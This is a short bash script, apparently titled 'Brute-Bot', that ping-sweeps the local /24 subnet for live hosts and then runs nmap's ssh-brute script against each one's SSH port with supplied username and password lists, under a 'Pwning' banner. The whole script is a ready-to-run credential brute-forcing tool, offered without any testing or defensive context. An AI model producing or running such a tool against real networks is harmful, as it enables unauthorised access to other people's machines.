#!/usr/bin/bash



echo "______            _             ______       _   ";
echo "| ___ \          | |            | ___ \     | |  ";
echo "| |_/ /_ __ _   _| |_ ___ ______| |_/ / ___ | |_ ";
echo "| ___ \ '__| | | | __/ _ \______| ___ \/ _ \| __|";
echo "| |_/ / |  | |_| | ||  __/      | |_/ / (_) | |_ ";
echo "\____/|_|   \__,_|\__\___|      \____/ \___/ \__|";
echo "                                                 ";
echo "                                                 ";

ifconfig | grep "broadcast" | cut -d " " -f 10 | cut -d "." -f 1,2,3 | uniq > octets.txt
echo "================================================="
cat octets.txt | while read line || [[ -n $line ]];
do
	for ip in {1..254}
	do
	ping -c 1 $line.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" >> octets.txt &
	done
done


echo "______                _             ";
echo "| ___ \              (_)            ";
echo "| |_/ /_      ___ __  _ _ __   __ _ ";
echo "|  __/\ \ /\ / / '_ \| | '_ \ / _\` |";
echo "| |    \ V  V /| | | | | | | | (_| |";
echo "\_|     \_/\_/ |_| |_|_|_| |_|\__, |";
echo "                               __/ |";
echo "                              |___/ ";


sudo nmap --script ssh-brute -p22 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
rm octets.txt
exit

